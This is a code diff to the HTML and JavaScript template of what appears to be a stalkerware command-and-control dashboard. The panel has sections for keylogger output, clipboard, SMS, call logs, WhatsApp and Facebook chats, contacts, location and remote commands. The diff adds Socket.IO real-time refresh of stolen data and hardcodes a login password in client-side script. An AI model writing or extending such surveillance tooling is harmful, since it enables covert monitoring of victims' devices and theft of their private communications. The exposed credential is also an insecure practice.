@@ -161,7 +161,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
       <div class="nav-item" data-section="notifications"><svg><use href="/static/icons.svg#icon-bell"/></svg> Notifications <span class="badge" id="notifBadge">{{ total_notif }}</span></div>
       <div class="nav-item" data-section="chats"><svg><use href="/static/icons.svg#icon-chat"/></svg> Chats</div>
       <div class="nav-item" data-section="facebook"><svg><use href="/static/icons.svg#icon-globe"/></svg> Facebook</div>
-      <div class="nav-item" data-section="whatsapp"><svg><use href="/static/icons.svg#icon-whatsapp"/></svg> WhatsApp</div>
+      <div class="nav-item" data-section="whatsapp"><svg><use href="/static/icons.svg#icon-chat"/></svg> WhatsApp</div>
       <div class="nav-item" data-section="contacts"><svg><use href="/static/icons.svg#icon-contacts"/></svg> Contacts</div>
       <div class="nav-item" data-section="apps"><svg><use href="/static/icons.svg#icon-apps"/></svg> App Usage</div>
       <div class="nav-item" data-section="devices"><svg><use href="/static/icons.svg#icon-devices"/></svg> Devices <span class="badge" id="devBadge">{{ total_devices }}</span></div>
@@ -348,6 +348,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
   </div>
 </div>
 
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
 <script>
 const BASE_URL = '{{ base_url }}';
 const SECTION_NAMES = {overview:'Overview',location:'Location',keylog:'Keylogger',clipboard:'Clipboard',calls:'Call Logs',sms:'SMS',notifications:'Notifications',chats:'Chats',facebook:'Facebook',whatsapp:'WhatsApp',contacts:'Contacts',apps:'App Usage',devices:'Devices',commands:'Commands',settings:'Settings'};
@@ -413,6 +414,51 @@ document.querySelectorAll('.nav-item').forEach(el=>{
 });
 
 async function api(url){try{let r=await fetch(url);return await r.json()}catch(e){return null}}
+
+// ============ REAL-TIME (Socket.IO) ============
+let wsConnected = false;
+const ws = io(window.location.origin, { transports: ['websocket', 'polling'] });
+
+ws.on('connect', () => {
+  wsConnected = true;
+  // Kirim auth password
+  ws.emit('auth', { password: 'Kosay378%' });
+});
+
+ws.on('auth_ok', () => {
+  console.log('[WS] Authenticated - real-time aktif');
+  document.getElementById('statusText').textContent = 'Real-time';
+});
+
+ws.on('auth_error', () => {
+  console.log('[WS] Auth failed');
+});
+
+ws.on('update', (msg) => {
+  // Data baru masuk — refresh section yang aktif
+  let active = document.querySelector('.section.active');
+  if (active) {
+    let id = active.id.replace('sec-', '');
+    // Auto-refresh section yang relevan
+    let refreshMap = {
+      'keylog': 'keylog', 'clipboard': 'clipboard', 'calls': 'calls',
+      'sms': 'sms', 'notifications': 'notif', 'contacts': 'contacts',
+      'apps': 'apps', 'devices': 'devices', 'location': 'location',
+      'overview': 'overview', 'facebook': 'facebook', 'whatsapp': 'whatsapp'
+    };
+    if (refreshMap[id]) {
+      let fn = 'load' + refreshMap[id].charAt(0).toUpperCase() + refreshMap[id].slice(1);
+      if (window[fn]) window[fn]();
+    }
+  }
+});
+
+ws.on('disconnect', () => {
+  wsConnected = false;
+  document.getElementById('statusText').textContent = 'Offline';
+});
+
+// ============ END REAL-TIME ============
 
 // Overview
 async function loadOverview(){
@@ -749,7 +795,7 @@ setInterval(()=>{
     else if(id=='apps') loadApps();
     else if(id=='devices') loadDevices();
   }
-},15000);
+},60000);  // Fallback 60 detik (real-time lewat WebSocket)
 
 // Session idle timeout — logout setelah 30 menit tidak aktivitas
 let idleTimer;
